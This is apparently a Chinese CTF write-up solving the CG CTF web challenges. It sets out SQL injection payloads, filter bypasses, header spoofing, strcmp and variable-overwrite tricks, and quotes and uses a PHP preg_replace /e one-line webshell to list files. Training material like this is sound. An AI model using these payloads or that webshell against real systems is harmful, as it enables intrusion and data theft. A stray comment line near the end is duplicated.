---
title: "CG CTF Web #2"
date: 2020-02-07T22:35:36+08:00
tags:
  - CTF
  - Web
categories:
  - Penetration
---

## 0x00 [变量覆盖](http://chinalover.sinaapp.com/web18/index.php)

给出代码如下

```php

<?php
include("secret.php");
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    extract($_POST);
    if ($pass == $thepassword_123) {
        echo $theflag;
    }
} ?>

```

<!-- more -->

其中重要的是这一句 `if ($pass == $thepassword_123)` ，题目名叫变量覆盖，猜想需要传入这两个变量覆盖默认的变量。

在本地终端运行 `curl http://chinalover.sinaapp.com/web18/index.php -X POST -d "pass=1&thepassword_123=1"`

成功取得 Flag

## 0x01 [PHP 是世界上最好的语言](http://way.nuptzj.cn/php/index.php)

又是这个域名，访问不了啊啊啊

## 0x02 [伪装者](http://chinalover.sinaapp.com/web4/xxx.php)

通过搜索发现可以在 header 中加入 X-Forwarded-For: 127.0.0.1 达到本地登陆的效果，但是无效，加入 client-ip: 127.0.0.1 后成功

## 0x03 [HEADER](http://way.nuptzj.cn/web5/)

又又又又又又挂了

## 0x04 [上传绕过](http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html)

在网页元素中发现 upload.php 文件，内容为 `Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件`

上传一张图片试试，提示 `必须上传成后缀名为php的文件才行啊！`

做不来，各种姿势都尝试过了，以后再说。

## 0x05 [SQL 注入 1](http://chinalover.sinaapp.com/index.php)

给出源码

```php

<?php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $user = trim($_POST[user]);
    $pass = md5(trim($_POST[pass]));
    $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
    $query = mysql_fetch_array(mysql_query($sql));
    if($query[user]=="admin") {
        echo "<p>Logged in! flag:******************** </p>";
    }
    if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
    }
}
echo $query[user];
?>
```

构造 `user=admin')#&pass=1` 即可

## 0x06 [pass check](http://chinalover.sinaapp.com/web21/)

给出代码

```php
$pass=@$_POST['pass'];
$pass1=***********;//被隐藏起来的密码
if(isset($pass)){
    if(@!strcmp($pass,$pass1)){
        echo "flag:nctf{*}";
    }else{
        echo "the pass is wrong!";
    }
}else{
    echo "please input pass!";
}
?>
```

尝试变量覆盖失败,查找 strcmp 函数的绕过方法。

> Php5.3 之后版本使用 strcmp 比较一个字符串和数组的话,将不再返回-1 而是返回 0

构造 `curl http://chinalover.sinaapp.com/web21/ -X POST -d "pass[]=1"`

得到 Flag。

## 0x07 [起名字真难](http://chinalover.sinaapp.com/web12/index.php)

给出源码

```php
<?php
function noother_says_correct($number){
    $one = ord('1');
    $nine = ord('9');
    for ($i = 0; $i < strlen($number); $i++)
    {
        $digit = ord($number{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
                return false;
        }
    }
    return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
   echo $flag;
else
   echo 'access denied';
?>
```

key 不能为 1-9 的数字, 但是要求等于 '54975581388'

这个数字刚好是 0xccccccccc ,传入参数得到 key

## 0x08 [密码重置](http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==)

一看网址就发现了 base64 编码的参数，解密后 是 ctfuser，即当前页面的默认用户名。我们需要重置 admin 的密码，那么网址的参数需要改为 admin 的 base64 编码 YWRtaW4= 。

然后发现表单中的用户名被设置成了 readonly ，按 F12 改为 admin 即可。

## 0x09 [SQL Injection](http://chinalover.sinaapp.com/web15/index.php)

网页中注释源码

```php
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
```

> stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。
>
> 提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。
>
> htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为 html 实体,这样我们就不能闭合源码中的 ’ 了
>
> 简单的说，就是我们加的 \ 会被去掉，’ 或者 ” 会被转变。

> 1.  对于 PHP magic_quotes_gpc=on 的情况， 我们可以不对输入和输出数据库的字符串数据作 addslashes()和 stripslashes()的操作,数据也会正常显示。
>
> 如果此时你对输入的数据作了 addslashes()处理，那么在输出的时候就必须使用 stripslashes()去掉多余的反斜杠。
>
> 2. 对于 PHP magic_quotes_gpc=off 的情况
>
>    必须使用 addslashes()对输入数据进行处理，但并不需要使用 stripslashes()格式化输出，因为 addslashes()并未将反斜杠一起写入数据库，只是帮助 mysql 完成了 sql 语句的执行。

> 这个特性在 PHP5.3.0 中已经废弃并且在 5.4.0 中已经移除了（This feature has been DEPRECATED as of PHP 5.3.0 and REMOVED as of PHP 5.4.0.）。所以没有理由再使用魔术引号，因为它不再是 PHP 支持的一部分。 不过它帮助了新手在不知不觉中写出了更好（更安全）的代码。 但是在处理代码的时候，最好是更改你的代码而不是依赖于魔术引号的开启。

查询语句：
`SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';`

整理后为`SELECT * FROM users WHERE name=' username ' AND pass=' password ';`

构造 `?username=admin%20\&password=%20or%201=1%23`

使得后台执行的语句为 `SELECT * FROM users WHERE name=' admin \' AND pass=' or 1=1`

## 0x0a [综合题](http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php)

jsfuck 编码，在 FireFox 的控制台里竟然没有办法直接运行！？还报了一行警告： Scam Warning: Take care when pasting things you don’t understand. This could allow attackers to steal your identity or take control of your computer. Please type ‘allow pasting’ below (no need to press enter) to allow pasting. 我觉得有道理，就放在 Chrome 的控制台里执行了。

结果： `1bc29b36f623ba82aaf6724fd3b16718.php`

访问得到提示： `哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里`

说明在响应头里，得到提示 `tip: history of bash`

bash 的历史记录储存在 .bash_history 文件里面，尝试访问。得到 `zip -r flagbak.zip ./*` ,一个打包的命令，下载该文件并解压，得到 Flag

## 0x0b [SQL 注入 2](http://4.chinalover.sinaapp.com/web6/index.php)

题目说主要考察 UNION 查询，给出了源代码

```php

<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```

查询语句 `select pw from ctf where user='$user'` ，将 pass 进行 MD5 加密后与选到的密码进行对比。

构造 `user=%27union select md5(1)%23&pass=1` 即可

## 0x0c [综合题 2](http://cms.nuptzj.cn/)

### 一个很有意思的网站，先收集一下信息。

- index.php 主页文件
- about.php 可以查看其他文件
- sm.txt CMS 的说明文档
- config.php 数据库信息
- passencode.php 加密算法
- say.php 用于接受和处理用户留言请求
- so.php 搜索
- preview.php 预览

admin 表结构 create table admin ( id integer, username text, userpass text, )

已知页面的参数

- about.php?file=<filename>
  可以传一个 file 参数
- index.php?page=1
  在第二页发现内容 `<?php eval($_POST['1:123',1)#`
- say.php
  say.php?nice=&usersay=&Submit=确认提交

### 尝试通过 about.php 获取其他文件内容。

1. index.php

   ```php
   <?php if(!isset($_COOKIE['username'])){ setcookie('username',''); setcookie('userpass',''); } ?>
   <?php //这里输出用户留言
   include 'antixss.php';
   include 'config.php';
   $con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());
   mysql_select_db($db_name,$con);
   $page=$_GET['page'];
   if($page=="" || $page==0){ $page='1'; }
   $page=intval($page);
   $start=($page-1)*7;
   $last=$page*7;
   $result=mysql_query("SELECT * FROM `message` WHERE display=1 ORDER BY id LIMIT $start,$last");
   if(mysql_num_rows($result)>0){
       while($rs=mysql_fetch_array($result)){
           echo htmlspecialchars($rs['nice'],ENT_QUOTES).":<br />";
           echo '&nbsp;&nbsp;&nbsp;&nbsp;'.antixss($rs['say']).'<br /><hr />';
       }
   }
   mysql_free_result($result); ?>
   <?php
   $contents=mysql_query("SELECT * FROM `message` WHERE display=1");
   if(mysql_num_rows($contents)>0){
       $num=mysql_num_rows($contents);
       if($num%8!=0){ $pagenum=intval($num/8)+1;
       }
       else{
           $pagenum=intval($num/8);
       }
       for($i=1;$i<=$pagenum;$i++){
           echo '<a href="index.php?page='.htmlspecialchars($i).'">'.htmlspecialchars($i).'</a>&nbsp;';
       }
   }
   mysql_free_result($contents);
   mysql_close($con);
   ?>
   ```

   在文件前看到 setcookie 函数，查看响应头发现格式如下。
   username=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
   userpass=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT

2. about.php

   ```php
   <?php
   $file=$_GET['file'];
   if($file=="" || strstr($file,'config.php')){
       echo "file参数不能为空！";
       exit();
   }
   else{
       $cut=strchr($file,"loginxlcteam");
       if($cut==false){
           data=file_get_contents($file);
           $date=htmlspecialchars($data);
           echo $date;
       }
       else{
           echo "<script>alert('敏感目录，禁止查看！但是。。。')</script>";
       }
   }
   ```

3. so.php

   ```php
    <?php
    if($_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser"){
       echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';
       exit();
    }
    $id=$_POST['soid'];
    include 'config.php';
    include 'antiinject.php';
    include 'antixss.php';
    $id=antiinject($id);
    $con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());
    mysql_select_db($db_name,$con);
    $id=mysql_real_escape_string($id);
    $result=mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id"); $rs=mysql_fetch_array($result);
    echo htmlspecialchars($rs['nice']).':<br />&nbsp;&nbsp;&nbsp;&nbsp;'.antixss($rs['say']).'<br />';
    mysql_free_result($result);
    mysql_free_result($file);
    mysql_close($con);
    ?>
   ```

4. passencode.php

   ```php
   <?php
   function passencode($content){
       //$pass=urlencode($content);
       $array=str_split($content);
       $pass="";
       for($i=0;$i<count($array);$i++){
           if($pass!=""){
               $pass=$pass." ".(string)ord($array[$i]);
           }else{
               $pass=(string)ord($array[$i]);
           }
       }
   return $pass;
   }
   ?>
   ```

5. say.php

   ```php
   <?php
   include 'config.php';
   $nice=$_POST['nice'];
   $say=$_POST['usersay'];
   if(!isset($_COOKIE['username'])){
       setcookie('username',$nice);
       setcookie('userpass','');
   }
   $username=$_COOKIE['username'];
   $userpass=$_COOKIE['userpass'];
   if($nice=="" || $say==""){
       echo "<script>alert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)');</script>";
       exit();
   }
   $con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());
   mysql_select_db($db_name,$con);
   $nice=mysql_real_escape_string($nice);
   $username=mysql_real_escape_string($username);
   $userpass=mysql_real_escape_string($userpass);
   $result=mysql_query("SELECT username FROM admin where username='$nice'",$con);
   $login=mysql_query("SELECT * FROM admin where username='$username' AND userpass='$userpass'",$con);
   if(mysql_num_rows($result)>0 && mysql_num_rows($login)<=0){
       echo "<script>alert('昵称已被使用，请更换！');</script>"; mysql_free_result($login);
       mysql_free_result($result);
       mysql_close($con);
       exit();
   }
   mysql_free_result($login);
   mysql_free_result($result);
   $say=mysql_real_escape_string($say);
   mysql_query("insert into message (nice,say,display) values('$nice','$say',0)",$con);
   mysql_close($con);
   echo '<script>alert("构建和谐社会，留言需要经过管理员审核才可以显示！");window.location = "./index.php"</script>';
   ?>
   ```

6. preview.php
   ```php
   <?php
   $prenice=$_POST['nice'];
   $presay=$_POST['usersay'];
   include 'antixss.php';
   echo '"'.antixss($presay).'"';
   echo htmlspecialchars($prenice);
   echo antixss($presay);
   ?>
   ```

发现了一些新的页面 ./antiinject.php ./antixss.php ./loginxlcteam/

7. antiinject.php
   ```php
   <?php
   function antiinject($content){
       $keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");
       $info=strtolower($content);
       for($i=0;$i<=count($keyword);$i++){
           $info=str_replace($keyword[$i], '',$info);
       }
       return $info;
   } ?>
   ```
8. antixss.php
   ```php
   <?php
   function antixss($content){
       preg_match("/(.*)\[a\](.*)\[\/a\](.*)/",$content,$url);
       $key=array("(",")","&","\\","<",">","'","%28","%29"," on","data","src","eval","unescape","innerHTML","document","appendChild","createElement","write","String","setTimeout","cookie");
       //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i<=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'<a href="'.$re.'">'.$re.'</a>'.htmlspecialchars($url[3],ENT_QUOTES); } }
       ?>
   ```

### 尝试对 so.php 进行 sql 注入

将 User-Angent 改为 Xlcteam Browser，提交参数 soid 开始注入。

查询语句为 `SELECT * FROM `message` WHERE display=1 AND id=$id`

id 没有包裹引号，过滤规则双写即可绕过，因为是按顺序进行替换敏感词，因此在语句中插入 ‘=’ 也可

构造 `soid=1/**/aandnd/**/0/**/uniunionon/**/seselectlect/**/1,2,3,4` 回显为 2，3。
根据 admin 表结构一通注入 ，得到

`  admin   102 117 99 107 114 117 110 116 117`

密码转换出来后即可进入后台,提示有一个小马，使用 about.php 获取小马内容

```php
<?php $e = $_REQUEST['www'];
$arr = array($_POST['wtf'] => '|.*|e',);
array_walk($arr, $e, ''); ?>
```

        //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i<=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'<a href="'.$re.'">'.$re.'</a>'.htmlspecialchars($url[3],ENT_QUOTES); } }
        //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i<=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'<a href="'.$re.'">'.$re.'</a>'.htmlspecialchars($url[3],ENT_QUOTES); } }

> 数组的 value 中是|.\*|e，这里用到了正则匹配的 preg_replace()的一个漏洞：
>
> 参考 https://www.jb51.net/article/38714.htm
>
> 简单来说就是正则中/e(这里和|e 效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
> 所以我们可以传递 preg_replace 给 www，这样 array 中的值就是第一个参数，键就是第二个参数，正好可以利用 preg_replace 的漏洞，然后会执行$\_POST[‘wtf’]，就相当于一个一句话马了。

url 里加入参数 www=preg_replace ,post 参数 wtf=print_r(scandir(.)) 列出目录，flag 所在文件名为 '恭喜你获得 flag2.txt' , 利用 about.php 读取即可。
